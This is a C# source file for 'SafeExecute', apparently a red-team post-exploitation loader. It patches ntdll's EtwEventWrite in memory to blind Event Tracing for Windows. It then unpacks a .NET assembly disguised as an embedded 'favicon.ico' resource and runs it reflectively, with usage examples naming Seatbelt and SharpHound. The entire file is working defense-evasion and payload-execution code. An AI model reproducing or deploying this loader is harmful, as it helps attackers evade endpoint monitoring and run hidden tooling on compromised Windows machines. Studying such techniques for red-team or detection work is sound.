using System;
using System.Reflection;
using System.Runtime.InteropServices;

using System.IO;
using System.Linq;
using System.Text;
using System.IO.Compression;
using System.Collections.Generic;
using System.Net;

namespace SafeExecute
{
    public static class Program
    {
        class Win32
        {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);

            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        }

        /// <summary>
        /// Patches ETW EventWrite function to return immediately to evade ETW detection while using Execute-Assembly
        /// Expected parameters are:
        /// Namespace
        /// Optional MethodName
        /// Optional Arguments
        /// 
        /// Example: SafeExecute.exe seatbelt.program main
        /// Example: SafeExecute.exe SharpHound3.SharpHound InvokeSharpHound -h
        /// </summary>
        /// <param name="args"></param>
        public static void Main(string[] args)
        {
            string nameSpace = "";
            string methodName = "";
            List <string> arg = new List<string>();
            try
            {
                if (args.Count() < 1 || args[0] == null || args[0] == "")
                    throw new Exception("Not enough arguments given! You must specify at least assembly namespace!");

                if (args.Count() == 1 || (args[1] == null || args[1] == ""))
                {
                    Console.WriteLine("[+] No method name was given, setting method name to \"main\" ");
                    methodName = "main";
                }
                else
                {
                    methodName = args[1];
                }


                if (args.Count() <= 2)
                    arg.Add("");
                else
                    for (int i = 2; i < args.Count(); i++)
                    {
                        arg.Add(args[i]);
                    }

                nameSpace = args[0];
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error while parsing arguments!: {e.Message}");
                return;
            }

            try
            {
                Console.WriteLine("[+] Detecting os arch");

                if (is64B())
                {
                    Console.WriteLine("[+] Selected x64");
                    Console.WriteLine("[+] Attempting to patch EtwEventWrite with instruction c30000");
                    //Patch x64
                    Patch(new byte[] { 0xc3, 0x00, 0x00 });
                }
                else
                {
                    Console.WriteLine("[+] Selected x86");
                    Console.WriteLine("[+] Attempting to patch EtwEventWrite with instruction c21400");
                    // Patch x86
                    Patch(new byte[] { 0xc2, 0x14, 0x00 });
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error while patching EtwEventWrite!: {e.Message}");
                throw;
            }

            try
            {
                //Payload code from from NoAmci project: https://github.com/med0x2e/NoAmci
                // favicon.ico is an encoded and compressed version of the set assembly using DeflateStream and GzipStream APIs.
                //Maybe encrypt the stream with the target domain name (As postex tool we should know it...)
                Assembly assembly = Assembly.GetExecutingAssembly();
                Stream stream = assembly.GetManifestResourceStream("SafeExecute.favicon.ico");

                string decCompressedAssembly = Encoding.Default.GetString(gzipDecompress(stream));
                decCompressedAssembly = decCompressedAssembly.Replace("\0", string.Empty);
                byte[] decoded = Convert.FromBase64String(decCompressedAssembly);
                byte[] assemblyBin = deflateDecompress(decoded);

                //string[] args = { @"" };
                ExecuteTheThing(assemblyBin, nameSpace, methodName, arg.ToArray());
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error while executing assembly!: {e.Message}");
                throw;
            }

            Console.Write("Press enter key to exit");
            Console.ReadLine();
        }

        private static void ExecuteTheThing(byte[] bytes, string typeName, string methodName, string[] args)
        {
            try
            {
                Assembly assembly = Assembly.Load(bytes);

                //Sphagetto addition for SharpHound
                try
                {
                    MethodInfo attach = assembly.GetType("Costura.AssemblyLoader", false).GetMethod("Attach", (BindingFlags.Public | BindingFlags.Static));
                    attach.Invoke(assembly.GetType("Costura.AssemblyLoader", false), null);
                }
                catch (Exception)
                {
                }

                Type type = assembly.GetTypes().FirstOrDefault(x => x.FullName.ToLower().Equals(typeName.ToLower()));
                if (type == null)
                {
                    throw new Exception($"Given typename: {typeName} was not found!");
                }

                MethodInfo method = type.GetMethods().FirstOrDefault(x => x.Name.ToLower().Equals(methodName.ToLower()));
                if (method == null)
                {
                    throw new Exception($"Given method: {methodName} was not found!");
                }

                object instance = Activator.CreateInstance(type);

                //Automatically fix the case where method expects no parameters and an empty string was given
                ParameterInfo[] parameters = method.GetParameters();
                method.Invoke(instance, (parameters.Count() == 0 && args[0] == "") ? null : new object[] { args } );

            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error: {e.Message}");
                return;
            }
        }

        //Code taken from https://blog.xpnsec.com/hiding-your-dotnet-etw/
        private static void Patch(byte[] patch)
        {
            try
            {
                IntPtr ntdll = Win32.LoadLibrary("ntdll.dll");
                IntPtr etwEventSend = Win32.GetProcAddress(ntdll, "EtwEventWrite");

                uint oldProtect;
                Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Console.WriteLine($"[+] Original value:{Marshal.ReadInt16(etwEventSend).ToString("X6")}");
                if (Marshal.ReadInt16(etwEventSend).ToString("X6") == "0000C3")
                {
                    Console.WriteLine("[+] EtwEventWrite has already been patched!");
                    return;
                }
                Marshal.Copy(patch, 0, etwEventSend, patch.Length);
                Console.WriteLine($"[+] New value:{Marshal.ReadInt16(etwEventSend).ToString("X6")}");
            }
            catch
            {
                Console.WriteLine("Error unhooking ETW");
            }
        }
        //Stolen from NoAmci
        private static byte[] deflateDecompress(byte[] data)
        {
            byte[] decompressedArray = null;
            try
            {
                using (MemoryStream decompressedStream = new MemoryStream())
                {
                    using (MemoryStream compressStream = new MemoryStream(data))
                    {
                        using (DeflateStream deflateStream = new DeflateStream(compressStream, CompressionMode.Decompress))
                        {
                            deflateStream.CopyTo(decompressedStream);
                        }
                    }
                    decompressedArray = decompressedStream.ToArray();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("\nDeflate Compress Error: " + ex.Message);
                return null;
            }

            return decompressedArray;
        }
        //Stolen from NoAmci
        private static byte[] gzipDecompress(Stream sourceStream)
        {

            GZipStream decStream = null;
            byte[] tempBuffer = null;

            try
            {

                decStream = new GZipStream(sourceStream, CompressionMode.Decompress, true);

                tempBuffer = new byte[4];
                int position = (int)sourceStream.Length - 4;
                sourceStream.Position = position;

                sourceStream.Read(tempBuffer, 0, 4);

                sourceStream.Position = 0;

                int length = BitConverter.ToInt32(tempBuffer, 0);
                byte[] buffer = new byte[length + 100];
                int offset = 0;

                while (true)
                {
                    int bytesRead = decStream.Read(buffer, offset, 100);

                    if (bytesRead == 0)
                        break;

                    offset += bytesRead;
                }

                return buffer;
            }
            catch (ApplicationException ex)
            {
                Console.WriteLine("Error occured during decompression" + ex.Message);
                return null;
            }

            finally
            {
                if (sourceStream != null)
                    sourceStream.Close();

                if (decStream != null)
                    decStream.Close();
            }
        }

        //Stolen from NoAmci
        private static bool is64B()
        {
            bool is64B = true;

            if (IntPtr.Size == 4)
                is64B = false;

            return is64B;
        }

        //Stolen from NoAmci
        public static void CopyTo(this Stream source, Stream destination, int bufferSize = 81920)
        {
            byte[] array = new byte[bufferSize];
            int count;
            while ((count = source.Read(array, 0, array.Length)) != 0)
            {
                destination.Write(array, 0, count);
            }
        }
    }
}
